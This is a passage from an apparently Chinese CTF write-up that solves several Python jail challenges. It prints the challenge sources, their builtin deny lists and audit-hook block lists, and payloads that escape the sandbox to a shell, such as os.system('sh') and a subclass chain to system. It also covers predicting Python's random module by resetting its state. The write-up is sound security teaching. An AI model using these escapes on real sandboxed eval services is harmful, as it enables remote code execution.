class="string">&quot;2.backdoor&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(input_data == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">    func()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">elif</span>(input_data == <span class="string">&quot;2&quot;</span>):</span><br><span class="line">    backdoor()</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not found the choice&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>看到<code>len(code)&gt;6</code>估计又是从<code>help()</code>里去拿，发现直接用<code>! sh</code>进入不到shell里，又注意到help里有这么一段话：</p>
<p>Enter the name of any module, keyword, or topic to get help on writing Python programs and using Python modules. To quit this help utility and return to the interpreter, just type “quit”.</p>
<p>To get a list of available modules, keywords, symbols, or topics, type<br>
“modules”, “keywords”, “symbols”, or “topics”. Each module also comes<br>
with a one-line summary of what it does; to list the modules whose name<br>
or summary contain a given string such as “spam”, type “modules spam”.</p>
<p>在python的help中，如果我们输入<code>__main__</code>可以得到当前模块的帮助，能得到当前模块的信息，包括全局变量。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">NAME</span><br><span class="line">    __main__</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">    #it seems have a backdoor as `lake lake lake`</span><br><span class="line">    #but it seems be limited!</span><br><span class="line">    #can u find the key of it and use the backdoor</span><br><span class="line"></span><br><span class="line">FUNCTIONS</span><br><span class="line">    backdoor()</span><br><span class="line"></span><br><span class="line">    func()</span><br><span class="line"></span><br><span class="line">DATA</span><br><span class="line">    WELCOME = &#x27;\n  _         _          _         _          _  ...       ...</span><br><span class="line">    __annotations__ = &#123;&#125;</span><br><span class="line">    input_data = &#x27;1&#x27;</span><br><span class="line">    key_9d38ee7f31d6126d = &#x27;95c720690c2c83f0982ffba63ff87338&#x27;</span><br><span class="line"></span><br><span class="line">FILE</span><br><span class="line">    /home/ctf/server.py</span><br></pre></td></tr></table></figure>
<p>发现得到了key，拿到flag：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Now the program has two <span class="built_in">functions</span></span><br><span class="line">can you use dockerdoor</span><br><span class="line">1.func</span><br><span class="line">2.backdoor</span><br><span class="line">&gt; 2</span><br><span class="line">Please enter the admin key</span><br><span class="line">&gt;95c720690c2c83f0982ffba63ff87338</span><br><span class="line">&gt;__import__(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">flag=NSSCTF&#123;6a895fc7-2871-4496-a0d7-f0a5e6873f6c&#125;</span><br><span class="line">0</span><br><span class="line">problem <span class="keyword">in</span> server - SystemExit: 0</span><br></pre></td></tr></table></figure>
<h4 id="calc-jail-beginner-level5">calc_jail_beginner_level5</h4>
<p>level5 is so easy challenge</p>
<p>Let’s have nice idea to leak my flag</p>
<p>这题没有给附件，先连一下环境：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">It&#x27;s so easy challenge!</span><br><span class="line">Seems flag into the dir()</span><br></pre></td></tr></table></figure>
<p>尝试使用一句话RCE，发现过了，直接拿flag。ls发现这题有好几个文件：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">py</span><br><span class="line"></span><br><span class="line"><span class="comment">#It&#x27;s an challenge for jaillevel5 let&#x27;s read your flag!</span></span><br><span class="line"><span class="keyword">import</span> load_flag</span><br><span class="line"></span><br><span class="line">flag = load_flag.get_flag()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _ _                _ _____</span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | |              | | ____|</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| | |__</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | |/ _ \ \ / / _ \ |___ \</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |___) |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____/</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(WELCOME)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;It&#x27;s so easy challenge!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Seems flag into the dir()&quot;</span>)</span><br><span class="line">    repl()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repl</span>():</span><br><span class="line">    my_global_dict = <span class="built_in">dict</span>()</span><br><span class="line">    my_global_dict[<span class="string">&#x27;my_flag&#x27;</span>] = flag</span><br><span class="line">    input_code = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    complie_code = <span class="built_in">compile</span>(input_code, <span class="string">&#x27;&lt;string&gt;&#x27;</span>, <span class="string">&#x27;single&#x27;</span>)</span><br><span class="line">    <span class="built_in">exec</span>(complie_code, my_global_dict)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h4 id="laKe-laKe-laKe">laKe laKe laKe</h4>
<p>you’re an python master which solved l@ke l@ke l@ke</p>
<p>So now it’s time for laKe laKe laKe</p>
<p>Good luck!!!</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#You finsih these two challenge of leak</span></span><br><span class="line"><span class="comment">#So cool</span></span><br><span class="line"><span class="comment">#Now it&#x27;s time for laKe!!!!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.addaudithook</span><br><span class="line"></span><br><span class="line">BLACKED_LIST = [<span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line">eval_func = <span class="built_in">eval</span></span><br><span class="line">open_func = <span class="built_in">open</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> BLACKED_LIST:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[m]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">event, _</span>):</span><br><span class="line">    BALCKED_EVENTS = <span class="built_in">set</span>(&#123;<span class="string">&#x27;pty.spawn&#x27;</span>, <span class="string">&#x27;os.system&#x27;</span>, <span class="string">&#x27;os.exec&#x27;</span>, <span class="string">&#x27;os.posix_spawn&#x27;</span>,<span class="string">&#x27;os.spawn&#x27;</span>,<span class="string">&#x27;subprocess.Popen&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> event <span class="keyword">in</span> BALCKED_EVENTS:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Operation banned: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(event))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guesser</span>():</span><br><span class="line">    game_score = <span class="number">0</span></span><br><span class="line">    sys.stdout.write(<span class="string">&#x27;Can u guess the number? between 1 and 9999999999999 &gt; &#x27;</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line">    right_guesser_question_answer = random.randint(<span class="number">1</span>, <span class="number">9999999999999</span>)</span><br><span class="line">    sys.stdout, sys.stderr, challenge_original_stdout = StringIO(), StringIO(), sys.stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        input_data = eval_func(<span class="built_in">input</span>(<span class="string">&#x27;&#x27;</span>),&#123;&#125;,&#123;&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sys.stdout = challenge_original_stdout</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Seems not right! please guess it!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> game_score</span><br><span class="line">    sys.stdout = challenge_original_stdout</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> input_data == right_guesser_question_answer:</span><br><span class="line">        game_score += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> game_score</span><br><span class="line"></span><br><span class="line">WELCOME=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _       _  __      _       _  __      _       _  __    </span></span><br><span class="line"><span class="string"> | |     | |/ /     | |     | |/ /     | |     | |/ /    </span></span><br><span class="line"><span class="string"> | | __ _| &#x27; / ___  | | __ _| &#x27; / ___  | | __ _| &#x27; / ___ </span></span><br><span class="line"><span class="string"> | |/ _` |  &lt; / _ \ | |/ _` |  &lt; / _ \ | |/ _` |  &lt; / _ \</span></span><br><span class="line"><span class="string"> | | (_| | . \  __/ | | (_| | . \  __/ | | (_| | . \  __/</span></span><br><span class="line"><span class="string"> |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|</span></span><br><span class="line"><span class="string">                                                         </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(WELCOME)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Welcome to my guesser game!&#x27;</span>)</span><br><span class="line">    game_score = guesser()</span><br><span class="line">    <span class="keyword">if</span> game_score == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;you are really super guesser!!!!&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(open_func(<span class="string">&#x27;flag&#x27;</span>).read())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Guess game end!!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sys.addaudithook(my_audit_hook)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>题目引入了一个<code>sys.addaudithook</code>机制，这个机制为了给沙箱提供安全保障，题目也ban掉了大部分常用的RCE函数，也ban了<code>'compile', 'eval', 'exec', 'open'</code>这几个。</p>
<p>题目的实质不难看出这是个猜数游戏，用<code>random.randint</code>进行的一个猜数游戏。这里牵扯到一个random库的随机数生成问题。接下来来回顾一下：</p>
<p><code>random</code>库生成随机数用<code>getrandbits(32)</code>，每次产生32位序列，每组随机数为624个，然后进行一轮旋转产生一波新的624个随机数。</p>
<p>以前没有研究过的是，在这个随机库中还包含两个比较实用的函数<code>getstate()</code>和<code>setstate()</code>。通过导库之后用<code>getstate()</code>可以得到一个元组（省略号省略了624个32位随机数）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">3</span>, (..., <span class="number">624</span>), <span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
<p>经过简单的测试发现在这个三元组里第一和第三个元素始终是3和None，第二个元组中最后一个数其实类似于一个随机数指针，指向现在生成到的随机数，通过调用一次<code>getrandint(32)</code>之后发现改变：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">3</span>, (..., <span class="number">1</span>), <span class="literal">None</span>)</span><br></pre></td></tr></table></figure>
<p>同时，省略号的随机数序列也更新到了新的一组。这里我尝试用<code>setstate()</code>将当前的state转回0位置，这样我再生成的随机数和一开始的随机数是一致的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(getrandbits(<span class="number">32</span>))</span><br><span class="line">res = getstate()</span><br><span class="line">setstate((<span class="number">3</span>, <span class="built_in">tuple</span>(<span class="built_in">list</span>(res[<span class="number">1</span>][:<span class="number">624</span>]) + [<span class="number">0</span>]), <span class="literal">None</span>))</span><br><span class="line"><span class="built_in">print</span>(getrandbits(<span class="number">32</span>))</span><br></pre></td></tr></table></figure>
<p>所以，可以通过这个方法输入一个操作，使得我们能获得当前随机数序列的状态state，并回到0位置重新生成一个题目的生成<code>random.randint(1, 9999999999999)</code>，这样我们生成的随机数和题目的随机数应该是一摸一样的，相当于”猜“出了这个随机数。</p>
<p>现在问题来了，该如何在一行代码里满足我们的这个操作呢？</p>
<p>这里不得不提到之前做题时经常发现的一个比较抽象的运算符<code>:=</code>（这玩意在py3.8引入，还有一个广泛的别名：它长得比较像海象，所以又叫<strong>海象运算符</strong>，用这个运算符可以构成<strong>赋值表达式</strong>）。</p>
<p>这个运算符可以对表达式进行赋值给运算符左边的变量，举个例子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(</span><br><span class="line">    [</span><br><span class="line">        random := <span class="built_in">__import__</span>(<span class="string">&quot;random&quot;</span>),</span><br><span class="line">        random.randint(<span class="number">1</span>, <span class="number">9999999999999</span>),</span><br><span class="line">        random.setstate((<span class="number">3</span>, <span class="built_in">tuple</span>(<span class="built_in">list</span>(random.getstate()[<span class="number">1</span>][:<span class="number">624</span>]) + [<span class="number">0</span>]), <span class="literal">None</span>)),</span><br><span class="line">        random.randint(<span class="number">1</span>, <span class="number">9999999999999</span>),</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [&lt;module &#x27;random&#x27; from &#x27;random.py&#x27;&gt;, 4180160353219, None, 4180160353219]</span></span><br></pre></td></tr></table></figure>
<p>我们用一个list来装这四个表达式，第一个表达式我们用<code>__import__</code>来导入random库，并直接赋值给random参数，相当于直接用random导入了random库<code>import random</code>，接下来由于list是从前往后运算的性质，接下来就可以利用<code>random.</code>去引用库函数了，根据上面的随机数理论，在第二个和第四个表达式中生成的两个随机数应该是一样的，所以根据这个思路，就可以用一句话去得到我们需要猜的数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[random := <span class="built_in">__import__</span>(<span class="string">&quot;random&quot;</span>), random.setstate((<span class="number">3</span>, <span class="built_in">tuple</span>(<span class="built_in">list</span>(random.getstate()[<span class="number">1</span>][:<span class="number">624</span>]) + [<span class="number">0</span>]), <span class="literal">None</span>)), random.randint(<span class="number">1</span>, <span class="number">9999999999999</span>)][-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<h4 id="4-byte-command">4 byte command</h4>
<p>4byte to rce,So easy!!!</p>
<p>题目没有给附件，先连一下环境：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  _                _                           _       _ _   _                _ _  _</span><br><span class="line"> | |              (_)                         (_)     (_) | | |              | | || |</span><br><span class="line"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_</span><br><span class="line"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _|</span><br><span class="line"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |</span><br><span class="line"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_|</span><br><span class="line">              __/ |                          _/ |</span><br><span class="line">             |___/                          |__/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Welcome to the python jail</span><br><span class="line">Let&#x27;s have an beginner jail of calc</span><br><span class="line">Enter your expression and I will evaluate it for you.</span><br></pre></td></tr></table></figure>
<p>这里随便输入点东西，发现：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Enter your expression and I will evaluate it <span class="keyword">for</span> you.</span><br><span class="line">&gt; 1</span><br><span class="line">sh: 1: 1: not found</span><br></pre></td></tr></table></figure>
<p>这是直接在sh里执行了代码，这就提示我们是用的<code>os.system(input_data)</code>去执行的输入，所以我们直接输入<code>sh</code>即可拿到shell：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Enter your expression and I will evaluate it <span class="keyword">for</span> you.</span><br><span class="line">&gt; sh</span><br><span class="line">sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ cat flag</span></span><br><span class="line"><span class="string">flag=NSSCTF&#123;8b417c0a-f90f-4cfc-beb0-ee9b2573bba7&#125;</span></span><br></pre></td></tr></table></figure>
<p>源代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#4 byte to have an rce</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">WELCOME = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  _                _                           _       _ _   _                _ _  _</span></span><br><span class="line"><span class="string"> | |              (_)                         (_)     (_) | | |              | | || |</span></span><br><span class="line"><span class="string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | || |_</span></span><br><span class="line"><span class="string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ |__   _|</span></span><br><span class="line"><span class="string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |  | |</span></span><br><span class="line"><span class="string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|  |_|</span></span><br><span class="line"><span class="string">              __/ |                          _/ |</span></span><br><span class="line"><span class="string">             |___/                          |__/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(WELCOME)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the python jail&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(input_data)&gt;<span class="number">4</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Oh hacker!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(os.system(input_data)))</span><br></pre></td></tr></table></figure>
<h4 id="calc-jail-beginner-level5-1">calc_jail_beginner_level5.1</h4>
<p>crazyman has a bad error on level5</p>
<p>now level5.1 come back</p>
<p>work your exploit!!!</p>
<p>依然是没有给附件，连一下环境：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">It&#x27;s so easy challenge!</span><br><span class="line">Seems flag into the dir()</span><br></pre></td></tr></table></figure>
<p>尝试一句话RCE：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; __import__(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/home/ctf/./server.py&quot;</span>, line 42, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;/home/ctf/./server.py&quot;</span>, line 31, <span class="keyword">in</span> main</span><br><span class="line">  File <span class="string">&quot;/home/ctf/./server.py&quot;</span>, line 39, <span class="keyword">in</span> repl</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line 1, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;__import__&#x27;</span> is not defined</span><br></pre></td></tr></table></figure>
<p>发现甚至没有<code>__import__</code>，简单试了几个，发现也没有open，继续测试：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">dir</span>()</span><br><span class="line">[<span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;my_flag&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>查看一下<code>__builtins__</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; __builtins__</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/home/ctf/./server.py&quot;</span>, line 42, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;/home/ctf/./server.py&quot;</span>, line 31, <span class="keyword">in</span> main</span><br><span class="line">  File <span class="string">&quot;/home/ctf/./server.py&quot;</span>, line 39, <span class="keyword">in</span> repl</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line 1, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3.10/_sitebuiltins.py&quot;</span>, line 61, <span class="keyword">in</span> __repr__</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3.10/_sitebuiltins.py&quot;</span>, line 50, <span class="keyword">in</span> __setup</span><br><span class="line">NameError: name <span class="string">&#x27;open&#x27;</span> is not defined</span><br></pre></td></tr></table></figure>
<p>发现open没有无法直接得到<code>__builtins__</code>，这时想起了Show subclasses with tuple：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>
<p>发送之后得到了<code>__builtins__</code>。并且找到了<code> &lt;class 'os._wrap_close'&gt;</code>，就直接按照这个方法拿shell：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[-<span class="number">6</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>顺带获取一下源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#It&#x27;s an challenge for jaillevel5 let&#x27;s read your flag!</span></span><br><span class="line"><span class="keyword">import</span> load_flag</span><br><span class="line"></span><br><span class="line">BLACKLIST = [<span 